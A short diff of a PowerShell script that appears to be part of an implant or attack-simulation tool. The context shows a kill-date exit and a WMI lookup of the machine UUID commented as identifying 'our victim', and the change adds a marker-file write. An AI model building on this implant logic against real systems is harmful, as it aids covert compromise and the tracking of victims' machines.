@@ -18,6 +18,8 @@ if ((Get-Date)  -ge $terminationdate) {
     exit 2
 }
 
+# Write a marker file
+$markercontents | Out-File $markerlocation
 
 # Get UUID (will identify our victim)
 $uuid = get-wmiobject Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
